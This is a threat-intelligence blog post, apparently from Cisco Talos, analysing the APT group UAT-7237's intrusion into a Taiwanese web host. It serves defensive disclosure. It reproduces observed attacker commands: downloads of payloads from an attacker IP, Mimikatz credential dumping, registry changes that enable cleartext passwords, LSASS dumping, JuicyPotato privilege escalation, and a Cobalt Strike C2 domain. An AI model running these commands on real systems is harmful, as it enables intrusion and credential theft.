    <h1 class="text-center">UAT-7237 targets Taiwanese web hosting infrastructure</h1>

    <div class="text-center m-1">
        <div class="post-author">
            <span>By </span>
                <a href="https://blog.talosintelligence.com/author/asheer-malhotra/">Asheer Malhotra</a>, 
                <a href="https://blog.talosintelligence.com/author/brandon/">Brandon White</a>, 
                <a href="https://blog.talosintelligence.com/author/vitor-ventura/">Vitor Ventura</a>
        </div>

        <br/>
        <time class="post-datetime" datetime="August 15, 2025 06:00">
            Friday, August 15, 2025 06:00
        </time>

        <div class="m-3">
                            <a href="/category/apt/" class="category primary-category">
                                APT
                            </a>
                                                    <a href="/category/malware/" class="category primary-category">
                                malware
                            </a>
                                </div>
    </div>

    <section class="post-content-wrapper mt-5">
        <div class="post-content">
            <ul><li>Cisco Talos discovered UAT-7237, a Chinese-speaking advanced persistent threat (APT) group active since at least 2022, which has significant overlaps with UAT-5918.</li><li>UAT-7237 conducted a recent intrusion targeting web infrastructure entities within Taiwan and relies heavily on the use of open-sourced tooling, customized to a certain degree, likely to evade detection and conduct malicious activities within the compromised enterprise.</li><li>UAT-7237 aims to establish long-term persistence in high-value victim environments.</li><li>Talos also identified a customized Shellcode loader in UAT-7237's arsenal that we track as “SoundBill.” SoundBill can be used to decode and load any shellcode, including Cobalt Strike.</li></ul><hr><p>Talos assesses with high confidence that UAT-7237 is a Chinese-speaking APT group, focusing heavily on establishing long-term persistence in web infrastructure entities in Taiwan. Most of UAT-7237's tooling consists of open-sourced tools, customized to a certain extent, including the use of a customized Shellcode loader we track as “SoundBill.”</p><p>Talos further assesses that UAT-7237 is likely a subgroup of UAT-5918, operating under the same umbrella of threat actors. UAT-7237's tooling, victimology and dates of activity overlap significantly with <a href="https://blog.talosintelligence.com/uat-5918-targets-critical-infra-in-taiwan/">UAT-5918.</a> Additionally, both threat groups develop, customize and operate tooling using the Chinese language as their preliminary language of choice. </p><p>While Talos assesses that UAT-7237 is a subgroup of UAT-5918, there are some deviations in UAT-7237's tactics, techniques and procedures (TTPs) that necessitate its designation as a distinct threat actor:</p><ul><li>UAT-7237 primarily relies on the use of Cobalt Strike as its staple backdoor implant while UAT-5918 relies primarily on Meterpreter based reverse shells.</li><li>After a successful compromise, UAT-5918 typically deploys a flurry of web shells. However, UAT-7237's deployment of web shells is highly selective and only on a chosen few compromised endpoints.</li><li>While UAT-5918 relies on web shells as their primary channel of backdoor access, UAT-7237 relies on a combination of direct remote desktop protocol (RDP) access and SoftEther VPN clients to achieve the same.</li></ul><p>In a recent intrusion, UAT-7237 compromised, infiltrated and established long term persistence in a Taiwanese web hosting provider. It is worth noting that the threat actor had a particular interest in gaining access to the victim organization’s VPN and cloud infrastructure. UAT-7237 used open-source and customized tooling to perform several malicious operations in the enterprise, including reconnaissance, credential extraction, deploying bespoke malware, setting up backdoored access via VPN clients, network scanning and proliferation.</p><h2 id="initial-access-and-reconnaissance">Initial access and reconnaissance</h2><p>UAT-7237 gains initial access by exploiting known vulnerabilities on unpatched servers exposed to the internet. Once the target has been successfully compromised, UAT-7237, like any other stealth-oriented APT, conducts rapid fingerprinting to evaluate if the target is worth conducting further malicious actions on.</p><p>Reconnaissance consists of identifying remote hosts, both internal and on the internet:</p>
<!--kg-card-begin: html-->
<pre>
cmd /c nslookup &lt;victim’s_domain&gt;
cmd /c systeminfo
cmd /c curl
cmd /c ping 8[.]8[.]8[.]8                            
cmd /c ping 141[.]164[.]50[.]141          // Attacker controlled remote server.
cmd /c ping &lt;victim’s_domain&gt;
cmd /c ipconfig /all
</pre>
<!--kg-card-end: html-->
<p>While UAT-5918 immediately begins deploying web shells to establish backdoored channels of access, UAT-7237 deviates significantly, using the SoftEther VPN client (similar to Flax Typhoon) to persist their access, and later access the systems via RDP:</p>
<!--kg-card-begin: html-->
<pre>
cmd /c c:\temp\WM7Lite\download[.]exe  hxxp[://]141[.]164[.]50[.]141/sdksdk608/win-x64[.]rar c:\temp\WM7Lite\1[.]rar

powershell (new-object System[.]Net[.]WebClient).DownloadFile('hxxp[://]141[.]164[.]50[.]141/sdksdk608/vpn[.]rar','C:\Windows\Temp\vmware-SYSTEM\vmtools[.]rar')
</pre>
<!--kg-card-end: html-->
<p>Once UAT-7237 sets up initial access, reconnaissance and VPN-based access, they start preparing to pivot to additional systems in the enterprise to proliferate and conduct malicious activities:</p>
<!--kg-card-begin: html-->
<pre>
cmd[.]exe /c cd /d "&lt;remote_smb_share&gt;"&net use
cmd[.]exe /c cd /d "&lt;remote_smb_share&gt;"&dir \\&lt;remote_smb_share&gt;\c$\
cmd[.]exe /c cd /d "C:\"&net group "domain admins" /domain
cmd[.]exe /c cd /d "C:\"&net group "domain controllers" /domain
</pre>
<!--kg-card-end: html-->
<p>In addition to relying on living-off-the-land binaries (LOLBins), UAT-7237 actively employed Windows Management Instrumentation (WMI) based tooling during reconnaissance and proliferation such as <a href="https://github.com/GhostPack/SharpWMI">SharpWMI</a> and <a href="https://github.com/nccgroup/WMIcmd">WMICmd</a>:</p>
<!--kg-card-begin: html-->
<pre>
cmd[.]exe /c cd /d "C:\"&C:\ProgramData\dynatrace\sharpwmi[.]exe &lt;IP&gt; &lt;user&gt; &lt;pass&gt; cmd whoami

cmd.exe /c cd /d "C:\DotNet\"&WMIcmd.exe

wmic /node:&lt;IP&gt; /user:Administrator /password:&lt;pass&gt; process call create cmd.exe /c whoami
  
wmic /node:&lt;IP&gt; /user:Administrator /password:&lt;pass&gt; process call create cmd.exe /c netstat -ano >c:\1.txt

</pre>
<!--kg-card-end: html-->
<p>&nbsp;SharpWMI and WMICmd can both be used to execute WMI queries on remote hosts, and they allow for arbitrary command and code executions.</p><p>UAT-7237 fingerprinted any systems subsequently accessed using rudimentary window commands such as:</p>
<!--kg-card-begin: html-->
<pre>
cmd.exe /c systeminfo
cmd.exe /c tasklist
cmd.exe /c net1 user /domain
cmd.exe /c whoami /priv
cmd.exe /c quser
</pre>
<!--kg-card-end: html-->
<h2 id="post-compromise-tooling-and-actions-on-objectives">Post-compromise tooling and actions on objectives</h2><h3 id="soundbill">SoundBill</h3><p>After compromise, UAT-7237 deploys a variety of customized and open-source tooling to perform a variety of tasks on the infected endpoints. Talos tracks one of UAT-7237's custom-built tools as “SoundBill.” SoundBill is built based on &nbsp;“<a href="https://github.com/cdxiaodong/some-function-in-binary/blob/08b66e5504f03373bd70341a4493a7450091c471/%E5%BC%82%E6%88%96%2B%E6%B7%B7%E6%B7%86/%E5%BC%82%E6%88%96%2B%E6%B7%B7%E6%B7%86/%E5%BC%82%E6%88%96%2B%E6%B7%B7%E6%B7%86.cpp">VTHello</a>” and is a shellcode loader written in Chinese that will decode a file on disk named “ptiti.txt” and execute the resulting shellcode.</p><p>It is also worth noting that SoundBill contains two embedded executables. Both originate from QQ, a Chinese instant messaging software, and are likely used as decoy files in attacks involving spear phishing.</p><p>SoundBill’s payload (i.e., the shellcode) may be anything from, for example, a customized implementation of Mimikatz:</p>
<!--kg-card-begin: html-->
<pre>
VTSB.exe privilege::debug sekurlsa::logonpasswords exit
</pre>
<!--kg-card-end: html-->
<p>Or it may be a mechanism to execute arbitrary commands&nbsp;on the infected system, such as:</p>
<!--kg-card-begin: html-->
<pre>
c:\temp\vtsb.exe -c whoami
</pre>
<!--kg-card-end: html-->
<p>The shellcode may even be a position-independent Cobalt Strike payload that allows UAT-7237 to establish long term access for information stealing. So far, the Cobalt Strike beacons Talos have found to be compatible with SoundBill communicate over HTTPS with its command and control (C2): cvbbonwxtgvc3isfqfc52cwzja0kvuqd.lambda-url.ap-northeast-1[.]on[.]aws</p><h3 id="juicypotato">JuicyPotato</h3><p>UAT-7237 also uses JuicyPotato, a privilege escalation tool popular with Chinese-speaking threat actors, to execute multiple commands on endpoints such as:</p>
<!--kg-card-begin: html-->
<pre>
cmd.exe /c c:\hotfix\juicy2.exe -t * -c {6d18ad12-bde3-4393-b311-099c346e6df9} -p whoami
</pre>
<!--kg-card-end: html-->
<h2 id="configuration-changes">Configuration changes</h2><p>During intrusions on several occasions, UAT-7237 attempted to make configuration and setting changes to the Windows OS on the infected endpoints, such as disabling User Account Control (UAC) restriction via registry:</p>
<!--kg-card-begin: html-->
<pre>
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
</pre>
<!--kg-card-end: html-->
<p>They also attempted to enable storage of cleartext passwords:</p>
<!--kg-card-begin: html-->
<pre>
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
</pre>
<!--kg-card-end: html-->
<p>UAT-7237 also accessed the Component Services management console, likely to adjust privileges for their malicious components:</p>
<!--kg-card-begin: html-->
<pre>
mmc comexp.msc
</pre>
<!--kg-card-end: html-->

<p>Furthermore, UAT-7237 also finds VNC credentials and configuration from infected endpoints by searching the registry and disk:</p>
<!--kg-card-begin: html-->
<pre>
reg query "HKCU\Software\ORL\WinVNC3\Password"
dir c:\*vnc.ini /s /b
</pre>
<!--kg-card-end: html-->
<p>Another (likely open-source) tool is used to execute commands on the endpoint, specifically to invoke a BAT file and another executable — again for credential extraction:</p>
<!--kg-card-begin: html-->
<pre>
cmd.exe /c C:\hotfix\invoketest.exe  -cmd "cmd /c  C:\hotfix\1.bat"
cmd.exe /c C:\hotfix\invoketest.exe  -cmd "cmd /c   C:\hotfix\Project1.exe  C:\hotfix\SSP.dll"
</pre>
<!--kg-card-end: html-->
<p>“Project1[.]exe” above is the <a href="https://github.com/xunyang1/ssp_dump_lsass/">ssp_dump_lsass</a> project on GitHub. It takes a DLL file as an argument, injects it into the Local Security Authority Service (LSASS)&nbsp; process, which then dumps the LSASS process into a BIN file.</p><p>Optionally, JuicyPotato may be used to run the same credential extraction process via the BAT file:</p>
<!--kg-card-begin: html-->
<pre>
cmd.exe /c c:\hotfix\juicy2.exe -t * -c  {e60687f7-01a1-40aa-86ac-db1cbf673334} -p "c:\windows\system32\cmd.exe"  -a "/c c:\hotfix\1.bat"
</pre>
<!--kg-card-end: html-->
<p>The process dump obtained is then staged into an archive for exfiltration:</p>
<!--kg-card-begin: html-->
<pre>
cmd.exe /c "c:\program files\7-Zip\7z.exe"  a  C:\hotfix\1.zip  C:\hotfix\1.bin
</pre>
<!--kg-card-end: html-->
<h2 id="proliferating-through-the-enterprise">Proliferating through the enterprise</h2><p>UAT-7237 uses the following network scanning tooling:</p><p><strong>FScan:</strong> A network scanner tool used to scan for open ports against IP subnets:</p>
<!--kg-card-begin: html-->
<pre>
fileless -h 10.30.111.1/24 -nopoc -t 20
</pre>
<!--kg-card-end: html-->
<p><strong>SMB scans:</strong> To identify SMB services information on specific endpoints:</p>
<!--kg-card-begin: html-->
<pre>
smb_version 10.30.111.11 445
</pre>
<!--kg-card-end: html-->
<p>As soon as accessible systems are found, UAT-7237 will conduct additional recon to pivot to them using credentials they’ve extracted previously:</p>
<!--kg-card-begin: html-->
<pre>
cmd[.]exe /c netstat -ano |findstr 3389
cmd[.]exe /c nslookup &lt;victim’s_subdomains&gt;
cmd[.]exe /c net use  &lt;IP&gt;\ipc$ &lt;pass&gt;  /user:&lt;userid&gt;
cmd[.]exe /c dir   \\&lt;remote_system&gt;\c$
cmd[.]exe /c net use  \\&lt;remote_system&gt;\ipc$ /del
</pre>
<!--kg-card-end: html-->
